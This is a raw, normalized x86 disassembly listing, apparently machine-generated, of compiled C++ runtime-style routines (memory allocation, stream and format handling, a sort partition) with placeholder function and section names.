mov ecx eax
mov eax [ ebp - 0x214 ]
lea edi [ ebp - 0xf4 ]
mov [ ebp - 0x4 ] 0xc
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0xd8 ]
mov [ ebp - 0x4 ] 0xd
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0x68 ]
lea edi [ ebp - 0x1b8 ]
mov [ ebp - 0x4 ] 0xe
call sub_10057920
push eax
mov edx r--data
lea esi [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0xf
call sub_1001ccb0
add esp 0x4
mov ecx eax
lea eax [ ebp - 0xa0 ]
lea edi [ ebp - 0xbc ]
mov [ ebp - 0x4 ] 0x10
call sub_10057920
mov edx eax
mov ecx 0xc8
mov [ ebp - 0x4 ] 0x11
call sub_100205a0
cmp [ ebp - 0xa8 ] ebx
jb r-xdata
xor edi edi
xor ecx ecx
mov esi 0x7
mov [ ebp - 0xa8 ] esi
mov [ ebp - 0xac ] edi
mov [ ebp - 0xbc ] cx
cmp [ ebp - 0x150 ] ebx
jb r-xdata
mov eax [ ebp - 0xbc ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x150 ] esi
mov [ ebp - 0x154 ] edi
mov [ ebp - 0x164 ] ax
cmp [ ebp - 0x1a4 ] ebx
jb r-xdata
mov edx [ ebp - 0x164 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x1a4 ] esi
mov [ ebp - 0x1a8 ] edi
mov [ ebp - 0x1b8 ] dx
cmp [ ebp - 0xc4 ] ebx
jb r-xdata
mov ecx [ ebp - 0x1b8 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0xc4 ] esi
mov [ ebp - 0xc8 ] edi
mov [ ebp - 0xd8 ] cx
cmp [ ebp - 0xe0 ] ebx
jb r-xdata
mov eax [ ebp - 0xd8 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0xe0 ] esi
mov [ ebp - 0xe4 ] edi
mov [ ebp - 0xf4 ] ax
cmp [ ebp - 0xfc ] ebx
jb r-xdata
mov edx [ ebp - 0xf4 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0xfc ] esi
mov [ ebp - 0x100 ] edi
mov [ ebp - 0x110 ] dx
cmp [ ebp - 0x134 ] ebx
jb r-xdata
mov ecx [ ebp - 0x110 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x134 ] esi
mov [ ebp - 0x138 ] edi
mov [ ebp - 0x148 ] cx
cmp [ ebp - 0x188 ] ebx
jb r-xdata
mov eax [ ebp - 0x148 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x188 ] esi
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x19c ] ax
cmp [ ebp - 0x1c0 ] ebx
jb r-xdata
mov edx [ ebp - 0x19c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x1c0 ] esi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d4 ] dx
cmp [ ebp - 0x1f8 ] ebx
jb r-xdata
mov ecx [ ebp - 0x1d4 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x1f8 ] esi
mov [ ebp - 0x1fc ] edi
mov [ ebp - 0x20c ] cx
cmp [ ebp - 0x1dc ] ebx
jb r-xdata
mov eax [ ebp - 0x20c ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x1dc ] esi
mov [ ebp - 0x1e0 ] edi
mov [ ebp - 0x1f0 ] ax
cmp [ ebp - 0x16c ] ebx
jb r-xdata
mov edx [ ebp - 0x1f0 ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x16c ] esi
mov [ ebp - 0x170 ] edi
mov [ ebp - 0x180 ] dx
cmp [ ebp - 0x70 ] ebx
jb r-xdata
mov ecx [ ebp - 0x180 ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x74 ] edi
mov [ ebp - 0x84 ] cx
cmp [ ebp - 0x38 ] ebx
jb r-xdata
mov eax [ ebp - 0x84 ]
push eax
call sub_100187af
add esp 0x4
xor eax eax
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] edi
mov [ ebp - 0x4c ] ax
cmp [ ebp - 0x118 ] ebx
jb r-xdata
mov edx [ ebp - 0x4c ]
push edx
call sub_100187af
add esp 0x4
xor edx edx
mov [ ebp - 0x118 ] esi
mov [ ebp - 0x11c ] edi
mov [ ebp - 0x12c ] dx
cmp [ ebp - 0x54 ] ebx
jb r-xdata
mov ecx [ ebp - 0x12c ]
push ecx
call sub_100187af
add esp 0x4
xor ecx ecx
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x58 ] edi
mov [ ebp - 0x68 ] cx
cmp [ ebp - 0x8c ] ebx
jb r-xdata
mov eax [ ebp - 0x68 ]
push eax
call sub_100187af
add esp 0x4
mov eax 0x1
mov edx [ ebp - 0xa0 ]
push edx
call sub_100187af
add esp 0x4
sub_1006d780
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov esi [ edi ]
xor ebx ebx
cmp esi ebx
je r-xdata
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov [ edi ] eax
cmp eax ebx
jne r-xdata
cmp [ esi + 0x4 ] ebx
je r-xdata
mov edi eax
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn 0x4
push 0x8
push 0x40
call [ LocalAlloc@IAT ]
mov edi eax
mov [ esi + 0x4 ] eax
cmp edi ebx
jne r-xdata
mov esi [ esi + 0x4 ]
cmp [ esi + 0x4 ] ebx
jne r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
mov [ esi ] r--data
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] ebx
call sub_1001c970
mov eax [ ebp + 0x8 ]
mov [ esi + 0xc ] ebx
mov [ esi ] r--data
mov ecx [ eax + 0xc ]
mov [ esi + 0xc ] ecx
jmp r-xdata
push 0x10
push ebx
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
mov [ edi + 0x4 ] ebx
pop edi
pop esi
xor eax eax
pop ebx
pop ebp
retn 0x4
mov [ edi ] esi
cmp esi ebx
je r-xdata
sub_1006d830
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
call sub_10071ca2
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_100187af
add esp 0x4
sub_1006d857
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1004ef8a
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x107
pop ebp
retn
sub_1006d887
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
js r-xdata
call sub_10061e90
mov esi [ eax ]
call sub_10061e90
cmp esi [ eax ]
jl r-xdata
call sub_1004abc0
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_1006d8b0
push ebp
mov ebp esp
push ecx
mov eax [ eax + 0x1c ]
lea edx [ ebp - 0x4 ]
push edx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x0
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x94 ]
call eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ecx [ eax ]
push edx
push eax
mov eax [ ecx + 0x6c ]
call eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
mov edx [ ecx + 0x8 ]
push eax
call edx
xor eax eax
mov esp ebp
pop ebp
retn 0x8
mov eax 0x1
mov esp ebp
pop ebp
retn 0x8
sub_1006d902
mov edi edi
push ebp
mov ebp esp
sub esp 0x54
movsx eax [ ebp + 0x28 ]
push esi
mov esi [ ebp + 0x20 ]
push edi
xor edi edi
add eax 0xffffffbf
mov [ ebp - 0x4 ] edi
cmp eax 0x38
ja r-xdata
or [ esi ] 0x2
movzx eax [ eax + lookup_table_1006dbee ]
jmp [ eax * 4 + jump_table_1006db92 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
pop edi
mov [ eax + 0x4 ] ecx
pop esi
leave
retn 0x28
or [ esi ] 0x1
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x10 ]
mov eax [ ebp - 0xc ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x8 ]
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x14 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x14 ]
mov eax [ ebp - 0x14 ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x10 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x24 ]
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0xc
push eax
push 0x1f
push r--data
lea eax [ ebp - 0x2c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0x17
mov eax [ ebp + 0x24 ]
add eax 0x8
push eax
push 0xb
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x16e
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0xc
push 0x1
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x4
push eax
push r--data
lea eax [ ebp - 0x34 ]
jmp r-xdata
push r--data
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
call sub_1000723f
add esp 0x10
cmp eax edi
jl r-xdata
push r--data
lea eax [ ebp - 0x3c ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x44 ]
jmp r-xdata
push [ ebp + 0x24 ]
jmp r-xdata
push r--data
lea eax [ ebp - 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x1c
push eax
push 0x35
jmp r-xdata
mov eax [ ebp + 0x24 ]
add eax 0x18
push eax
push 0x6
jmp r-xdata
push r--data
lea eax [ ebp - 0x54 ]
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x63
push edi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001f0b8
or [ esi ] eax
add esp 0x18
test [ esi ] 0x2
jne r-xdata
push [ ebp + 0x24 ]
mov eax [ ecx ]
push esi
push [ ebp + 0x1c ]
lea edx [ ebp - 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call [ eax + 0x18 ]
mov eax [ ebp - 0x1c ]
mov [ ebp + 0xc ] eax
mov eax [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_100463af
test al al
je r-xdata
mov [ ebp + 0x10 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
add eax 0xffffffed
imul eax eax 0x64
push [ ebp + 0x24 ]
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10037c2f
mov ecx [ eax ]
mov [ ebp + 0xc ] ecx
mov eax [ eax + 0x4 ]
jmp r-xdata
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1001f0b8
add esp 0x18
or [ esi ] eax
jmp r-xdata
push edi
jmp r-xdata
push 0x1
mov eax [ ebp - 0x4 ]
mov ecx [ ebp + 0x24 ]
dec eax
mov [ ecx + 0x10 ] eax
jmp r-xdata
mov ecx [ ebp + 0x24 ]
imul eax eax 0xc
add [ ecx + 0x8 ] eax
jmp r-xdata
push 0x3b
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax 0x45
jge r-xdata
mov ecx [ ebp + 0x24 ]
mov [ ecx + 0x14 ] eax
jmp r-xdata
add eax 0x64
jmp r-xdata
sub_1006dc05
or [ ebx ] ecx
push ss
push ss
push ss
push ss
push ss
push ss
push ss
add [ ecx ] al
or al 0xd
or eax 0x16011616
push cs
push ss
push ss
movups xmm2 [ esi ]
adc [ esi ] edx
adc dl [ esi ]
adc [ esi ] dl
push ss
adc edx [ edx - 0x33333334 ]
int3
sub_1006dc30
push ebp
mov ebp esp
push 0xffffffff
push sub_10087952
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
xor esi esi
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x30 ] edi
cmp ecx esi
je r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + edi + 0xc ] esi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + edi + 0xc ] 0x0
sete cl
mov [ ebp - 0x2c ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + edi + 0x3c ]
cmp eax esi
je r-xdata
mov edx [ edi ]
mov ecx [ edx + 0x4 ]
mov edx [ ebp - 0x14 ]
add ecx edi
test edx edx
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x18 ]
push edx
add ecx edi
call sub_10013950
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10053d90
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x18 ]
add esp 0x4
mov [ ebp - 0x24 ] eax
test ebx ebx
je r-xdata
mov esi eax
call sub_1004ef40
mov [ ebp - 0x4 ] 0x5
call j_sub_1005b90d
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ edi ]
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + edi + 0x38 ]
movzx ecx [ ecx + edi + 0x40 ]
push edx
mov [ ebp - 0x20 ] 0x0
mov edx [ ebp - 0x20 ]
push edx
mov edx [ ebp + 0xc ]
push ecx
mov ecx [ ebp - 0x24 ]
add eax edi
push eax
lea esi [ ebp - 0x28 ]
call sub_10054490
cmp [ eax ] 0x0
je r-xdata
push 0x0
lea ecx [ ebp - 0x1c ]
call sub_10034e98
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_10035c70
push 0x0
call sub_1001bdc0
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov [ ebp - 0x14 ] 0x4
mov esi [ ebx + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x1c ]
not esi
call sub_10069747
and esi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_1006dd5d
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_1001bdc0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_1006de00
push ebp
mov ebp esp
sub esp 0x8
mov ecx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
mov eax ecx
sub eax ebx
sar eax 0x2
cdq
push esi
sub eax edx
sar eax 0x1
push edi
lea edi [ ebx + eax * 4 ]
mov eax [ ebp + 0x14 ]
push eax
add ecx 0xfffffffc
push ecx
mov esi ebx
call sub_10054d50
add esp 0x8
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] esi
cmp ebx edi
jae r-xdata
cmp esi [ ebp + 0x10 ]
jae r-xdata
lea ebx [ ebx ]
mov ebx edi
mov edi edi
mov edi edi
mov eax [ edi - 0x4 ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
cmp ebx [ ebp + 0xc ]
jbe r-xdata
mov eax [ esi ]
mov ecx [ edi ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] esi
mov ecx [ esi ]
mov edx [ edi ]
push ecx
push edx
call ebx
add esp 0x8
test eax eax
jne r-xdata
add edi 0xfffffffc
cmp ebx edi
jb r-xdata
jne r-xdata
mov eax [ edi ]
mov ecx [ ebx - 0x4 ]
push eax
push ecx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov edx [ edi ]
mov eax [ esi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
add esi 0x4
cmp esi [ ebp + 0x10 ]
jb r-xdata
mov ecx [ edi ]
mov edx [ edi - 0x4 ]
push ecx
push edx
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
sub ebx 0x4
cmp esi [ ebp + 0x10 ]
jne r-xdata
cmp esi [ ebp + 0x10 ]
je r-xdata
add ebx 0xfffffffc
cmp [ ebp + 0xc ] ebx
jb r-xdata
mov edx [ ebx - 0x4 ]
mov eax [ edi ]
push edx
push eax
call [ ebp + 0x14 ]
add esp 0x8
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov edx [ esi ]
mov eax ecx
add ecx 0x4
mov [ ebp - 0x4 ] ecx
mov ecx [ eax ]
mov [ eax ] edx
mov [ esi ] ecx
mov edx [ edi ]
mov eax [ esi ]
mov ebx [ ebp + 0x14 ]
push edx
push eax
call ebx
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esi ]
mov ecx [ ebx ]
mov [ esi ] ecx
mov [ ebx ] eax
add esi 0x4
jmp r-xdata
sub edi 0x4
cmp ebx edi
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov [ eax ] edi
pop edi
pop esi
mov [ eax + 0x4 ] edx
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp eax esi
je r-xdata
cmp ebx [ ebp + 0xc ]
mov ecx [ ebx - 0x4 ]
mov eax [ edi - 0x4 ]
sub edi 0x4
mov [ edi ] ecx
mov [ ebx - 0x4 ] eax
cmp esi [ ebp + 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax - 0x4 ]
mov ecx [ edi ]
sub eax 0x4
mov [ edi ] edx
mov [ ebp - 0x4 ] eax
mov [ eax ] ecx
jmp r-xdata
mov edx [ edi ]
mov eax [ ebx ]
mov [ ebx ] edx
mov [ edi ] eax
mov ecx edi
mov edx [ ecx ]
add eax 0x4
mov [ ebp - 0x4 ] eax
mov eax esi
mov [ ebp - 0x8 ] edx
mov edx [ eax ]
mov [ ecx ] edx
mov ecx [ ebp - 0x8 ]
add edi 0x4
add esi 0x4
mov [ eax ] ecx
jmp r-xdata
mov edx [ eax ]
mov ecx [ edi ]
mov [ edi ] edx
mov [ eax ] ecx
sub_1006dfc0
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
call sub_10034c90
mov ecx [ esi + 0x10 ]
push ecx
call sub_10034c90
mov edx [ esi + 0x14 ]
push edx
call sub_10034c90
add esp 0xc
pop esi
retn
sub_1006dfe3
push 0xc
mov eax sub_10085a34
call sub_100624bc
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov eax [ ebp + 0xc ]
and eax 0x2
mov [ ebp - 0x14 ] eax
je r-xdata
mov edi [ ebp + 0xc ]
and edi 0x8
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10060b30
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x20
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1006ece6
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov ecx esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100461c0
jmp r-xdata
test [ ebp + 0xc ] 0x20
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10053d90
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov eax [ ebp + 0xc ]
and eax 0x4
mov [ ebp - 0x10 ] eax
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10031319
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
mov edi [ ebp + 0x14 ]
cmp edi ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10001a0f
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x8
call sub_1001f84c
pop ecx
cmp eax ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_100554b0
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10002fc0
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
jmp r-xdata
push 0x18
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x7
cmp esi ebx
je r-xdata
cmp edi ebx
je r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov edi r--data
cmp [ ebp - 0x10 ] ebx
je r-xdata
cmp edi ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_10012f2b
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ eax + 0x4 ] ebx
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
push ebx
push ebx
call sub_1004d58a
xor edx edx
pop ecx
inc edx
pop ecx
mov ecx eax
shl edx cl
sar edx 0x1
test [ ebp + 0xc ] edx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x8
mov [ esi ] r--data
call sub_10053a20
jmp r-xdata
mov edi [ ebp + 0xc ]
and edi 0x10
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push edi
mov esi eax
call sub_1001bf9b
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp edi ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10059fdf
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x10
cmp esi ebx
je r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
mov [ esi ] r--data
call sub_10059d69
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
cmp [ ebp - 0x14 ] ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_100448b5
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x1c
call sub_1001f84c
pop ecx
mov ecx eax
mov [ ebp + 0xc ] ecx
mov [ ebp - 0x4 ] 0x1b
cmp ecx ebx
je r-xdata
cmp [ ebp + 0x14 ] ebx
jne r-xdata
xor esi esi
mov [ esi + 0x4 ] ebx
push ebx
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x4 ] 0x11
mov [ esi ] edi
mov [ esi + 0x28 ] bl
call sub_10003a38
mov [ esi ] r--data
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
call sub_10013ab8
retn
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_10051b1e
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x14
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push ebx
push [ ebp + 0x8 ]
call sub_10026122
mov esi eax
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_100129d7
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x34
call sub_1001f84c
mov esi eax
pop ecx
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x4 ] 0x16
cmp esi ebx
je r-xdata
cmp [ ebp - 0x10 ] ebx
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
mov ecx rw-data
call sub_100389e0
push eax
push esi
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0xc
jmp r-xdata
mov ecx rw-data
call sub_100389e0
push [ ebp + 0x14 ]
mov esi eax
call sub_1002b481
push esi
push eax
push [ ebp + 0x10 ]
call sub_1000673f
add esp 0x10
push 0x10
call sub_1001f84c
mov esi eax
pop ecx
cmp esi ebx
je r-xdata
xor esi esi
push [ ebp + 0x8 ]
mov [ esi + 0x4 ] ebx
